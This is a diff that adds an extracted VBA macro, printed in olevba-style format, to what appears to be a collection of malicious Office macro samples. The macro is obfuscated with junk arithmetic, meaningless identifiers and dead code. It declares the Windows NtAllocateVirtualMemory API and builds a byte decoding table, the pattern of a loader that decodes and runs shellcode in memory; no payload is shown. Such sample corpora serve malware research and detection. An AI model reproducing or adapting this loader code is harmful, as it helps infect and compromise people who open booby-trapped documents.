@@ -1,0 +1,55 @@
+Filename     : ./macros/4074ae1af5d6c514e895cdc9ba844dffc5e58cb13ce2665ed1a79a63bb1f937e
+OLE stream   : Macros/VBA/fmods
+VBA filename : fmods.bas
+----------------------------------------
+Attribute VB_Name = "fmods"
+#If (89 - 45 + 356 + 85 - 60 + 275) > ((52 - 85 + 353) - (91 - 2 + 451) * 1) And ((58 - 43 + 13) - (1 - 37 + 64)) * 2 < (Win64) Then
+Public Declare PtrSafe Function multicellular _
+Lib "ntdll    " Alias _
+"NtAllocateVirtualMemory" (daringly As LongPtr, mackerel As LongPtr, ByVal elucidation As LongPtr, gyroscopeByVal As LongPtr, atone As LongPtr, ByVal highness As LongPtr) As LongPtr
+#End If
+#If (88 - 29 + 341 + 9 - 125 + 416) > ((36 - 42 + 326) - (15 - 86 + 611) * 1) And Not ((8 - 117 + 137) - (22 - 112 + 118)) * 2 < (Win64) Then
+Public Declare Function multicellular _
+Lib "ntdll    " Alias _
+"NtAllocateVirtualMemory" (activating As Long, caseworm As Long, ByVal stretching As Long, kibeByVal As Long, alligatoridae As Long, ByVal dissocial As Long) As Long
+#End If
+Function fancies()
+Dim phyllium(255) As Byte
+buttondown = 58 - 93 + 100
+For i = buttondown To (47 - 50 + 94)
+phyllium(buttondown) = buttondown - (70 - 65 + 60)
+buttondown = buttondown + 1
+If (114 - 2 - 21) < buttondown Then
+akeridae = funk + 71 - 35 + 29
+Exit For
+beatic = culpam + 39 - 125 + 151
+End If
+Next
+buttondown = (10 - 87 + 125)
+For i = buttondown To (73 - 32 + 17)
+phyllium(buttondown) = buttondown + (75 - 118 + 47)
+buttondown = buttondown + 1
+If (30 - 32 + 60) < buttondown Then
+samekh = anthophyllite + 118 - 14 - 39
+Exit For
+toxiferous = millennial + 11 - 91 + 145
+End If
+Next
+buttondown = (61 - 10 + 46)
+For i = buttondown To (88 - 85 + 120)
+phyllium(buttondown) = buttondown - (77 - 86 + 80)
+buttondown = buttondown + 1
+heterostraci = als + 67 - 6 + 4
+If (6 - 5 + 122) < buttondown Then
+dropseed = epimedium + 117 - 11 - 41
+Exit For
+alpenstock = interminable + 19 - 54 + 100
+End If
+Next
+phyllium(68 - 44 + 23) = (45 - 24 + 42)
+buttondown = (116 - 99 + 26)
+phyllium(buttondown) = (113 - 123 + 72)
+fancies = phyllium
+End Function
+
+
